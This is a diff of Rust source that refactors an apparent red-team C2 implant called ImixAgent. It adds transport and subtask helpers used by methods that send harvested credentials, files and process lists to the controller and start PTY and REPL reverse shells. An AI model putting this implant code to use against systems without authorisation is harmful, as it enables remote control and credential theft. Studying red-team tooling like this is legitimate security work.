@@ -58,7 +58,7 @@ impl<T: Transport + 'static> ImixAgent<T> {
         *transport = t;
     }
 
-    // Flushes all buffered task outputs using the provided transport (or internal one if not provided, but here we assume internal is set by main)
+    // Flushes all buffered task outputs using the provided transport
     pub async fn flush_outputs(&self) {
         // Wait a short delay to allow tasks to produce output
         tokio::time::sleep(std::time::Duration::from_millis(100)).await;
@@ -136,20 +136,54 @@ impl<T: Transport + 'static> ImixAgent<T> {
     {
         self.runtime_handle.block_on(future)
     }
+
+    // Helper to execute an async action with a usable transport, handling setup and errors.
+    fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String>
+    where
+        F: FnOnce(T) -> Fut,
+        Fut: std::future::Future<Output = Result<R, anyhow::Error>>,
+    {
+        self.block_on(async {
+            let t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
+            action(t).await.map_err(|e| e.to_string())
+        })
+    }
+
+    // Helper to spawn a background subtask (like a reverse shell)
+    fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String>
+    where
+        F: FnOnce(T) -> Fut + Send + 'static,
+        Fut: std::future::Future<Output = Result<()>> + Send + 'static,
+    {
+        let subtasks = self.subtasks.clone();
+
+        // We need a transport for the subtask. Get it synchronously.
+        let transport = self.block_on(async {
+            self.get_usable_transport().await.map_err(|e| e.to_string())
+        })?;
+
+        let handle = self.runtime_handle.spawn(async move {
+            if let Err(e) = action(transport).await {
+                #[cfg(debug_assertions)]
+                log::error!("Subtask {} error: {e:#}", task_id);
+            }
+        });
+
+        if let Ok(mut map) = subtasks.lock() {
+            map.insert(task_id, handle);
+        }
+
+        Ok(())
+    }
 }
 
 // Implement the Eldritch Agent Trait
 impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
-        self.block_on(async {
-            let mut t = self
-                .get_usable_transport()
-                .await
-                .map_err(|e| e.to_string())?;
-
+        self.with_transport(|mut t| async move {
             // Transport uses std::sync::mpsc::Sender for fetch_asset
             let (tx, rx) = std::sync::mpsc::channel();
-            t.fetch_asset(req, tx).await.map_err(|e| e.to_string())?;
+            t.fetch_asset(req, tx).await?;
 
             let mut data = Vec::new();
             while let Ok(resp) = rx.recv() {
@@ -163,26 +197,16 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         &self,
         req: c2::ReportCredentialRequest,
     ) -> Result<c2::ReportCredentialResponse, String> {
-        self.block_on(async {
-            let mut t = self
-                .get_usable_transport()
-                .await
-                .map_err(|e| e.to_string())?;
-            t.report_credential(req).await.map_err(|e| e.to_string())
-        })
+        self.with_transport(|mut t| async move { t.report_credential(req).await })
     }
 
     fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
-        self.block_on(async {
-            let mut t = self
-                .get_usable_transport()
-                .await
-                .map_err(|e| e.to_string())?;
+        self.with_transport(|mut t| async move {
             // Transport uses std::sync::mpsc::Receiver for report_file
             let (tx, rx) = std::sync::mpsc::channel();
-            tx.send(req).map_err(|e| e.to_string())?;
+            tx.send(req)?;
             drop(tx);
-            t.report_file(rx).await.map_err(|e| e.to_string())
+            t.report_file(rx).await
         })
     }
 
@@ -190,13 +214,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         &self,
         req: c2::ReportProcessListRequest,
     ) -> Result<c2::ReportProcessListResponse, String> {
-        self.block_on(async {
-            let mut t = self
-                .get_usable_transport()
-                .await
-                .map_err(|e| e.to_string())?;
-            t.report_process_list(req).await.map_err(|e| e.to_string())
-        })
+        self.with_transport(|mut t| async move { t.report_process_list(req).await })
     }
 
     fn report_task_output(
@@ -214,59 +232,20 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     }
 
     fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
-        let subtasks = self.subtasks.clone();
-
-        // Get usable transport (new or existing)
-        let transport_clone =
-            self.block_on(async { self.get_usable_transport().await.map_err(|e| e.to_string()) })?;
-
-        let handle = self.runtime_handle.spawn(async move {
-            if let Err(_e) = run_reverse_shell_pty(task_id, cmd, transport_clone).await {
-                #[cfg(debug_assertions)]
-                log::error!("reverse_shell_pty error: {_e}");
-            }
-        });
-
-        // Store handle
-        if let Ok(mut map) = subtasks.lock() {
-            map.insert(task_id, handle);
-        }
-
-        Ok(())
+        self.spawn_subtask(task_id, move |transport| async move {
+             run_reverse_shell_pty(task_id, cmd, transport).await
+        })
     }
 
     fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
-        let subtasks = self.subtasks.clone();
         let agent = self.clone();
-
-        // Get usable transport (new or existing)
-        let transport_clone =
-            self.block_on(async { self.get_usable_transport().await.map_err(|e| e.to_string()) })?;
-
-        let handle = self.runtime_handle.spawn(async move {
-            if let Err(_e) = run_repl_reverse_shell(task_id, transport_clone, agent).await {
-                #[cfg(debug_assertions)]
-                log::error!("repl_reverse_shell error: {_e}");
-            }
-        });
-
-        if let Ok(mut map) = subtasks.lock() {
-            map.insert(task_id, handle);
-        }
-
-        Ok(())
+        self.spawn_subtask(task_id, move |transport| async move {
+            run_repl_reverse_shell(task_id, transport, agent).await
+        })
     }
 
     fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
-        // Direct claim tasks logic usually used internally or for chaining.
-        // We use get_usable_transport here as well to be safe.
-        self.block_on(async {
-            let mut t = self
-                .get_usable_transport()
-                .await
-                .map_err(|e| e.to_string())?;
-            t.claim_tasks(req).await.map_err(|e| e.to_string())
-        })
+        self.with_transport(|mut t| async move { t.claim_tasks(req).await })
     }
 
     fn get_transport(&self) -> Result<String, String> {
